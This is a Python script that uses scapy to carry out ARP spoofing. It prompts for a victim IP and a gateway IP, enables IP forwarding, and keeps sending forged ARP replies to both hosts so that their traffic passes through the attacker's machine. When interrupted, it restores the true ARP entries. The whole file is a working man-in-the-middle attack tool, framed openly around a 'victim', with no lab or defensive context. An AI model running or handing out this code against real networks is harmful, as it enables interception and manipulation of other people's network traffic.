from scapy.all import Ether, ARP, srp, send
import argparse
import time
import os
import sys

# enable ip routing for linux
def enable_linux_iproute():
    file_path = "/proc/sys/net/ipv4/ip_forward"  # Corrected path
    with open(file_path) as f:
        if f.read().strip() == '1':  # Ensure it's a string comparison
            return
    with open(file_path, 'w') as f:
        f.write('1')  # Enable IP forwarding

# enable ip routing for windows
def enable_windows_iproute():
    from services import WService
    service = WService("RemoteAccess")
    service.start()

# verifying ip routing
def enable_ip_route(verbose=True):
    if verbose:
        print("[!] Enabling IP Routing....")
    if os.name == "nt":
        enable_windows_iproute()
    else:
        enable_linux_iproute()  # Call the function properly

    if verbose:
        print("[!] IP Routing enabled.")

def get_mac(ip):
    # Return MAC address of any device connected
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip), timeout=3, verbose=0)
    
    if ans:
        return ans[0][1].src 

def spoof(target_ip, host_ip, verbose=True):
    # Get MAC address of the target, craft the malicious ARP reply(response) packet, and then send it.
    target_mac = get_mac(target_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    send(arp_response, verbose=0)

    if verbose:
        self_mac = ARP().hwsrc
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))
    
def restore(target_ip, host_ip, verbose=True):
    # Restoring the normal process of a regular network.
    target_mac = get_mac(target_ip)  # Target MAC 
    host_mac = get_mac(host_ip)  # Get the real MAC address of spoofed (gateway, i.e router)
    
    # Crafting the restoring packet
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")
    
    # Sending restoring packet
    send(arp_response, verbose=0, count=7)
    if verbose:
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))

if __name__ == "__main__":
    target = input("Enter the victim IP address: ")
    host = input("Enter the gateway IP address: ")
    verbose = True  # Print progress on screen
    
    enable_ip_route(verbose)  # Properly call the IP route enable function

    try:
        while True:
            # Telling the 'target' that we are the 'host'
            spoof(target, host, verbose)
            # Telling the 'host' that we are the 'target'
            spoof(host, target, verbose)

            time.sleep(1)

    except KeyboardInterrupt:
        print("[!] Detected CTRL+C! Restoring the network, please wait...")
        restore(target, host)
        restore(host, target)
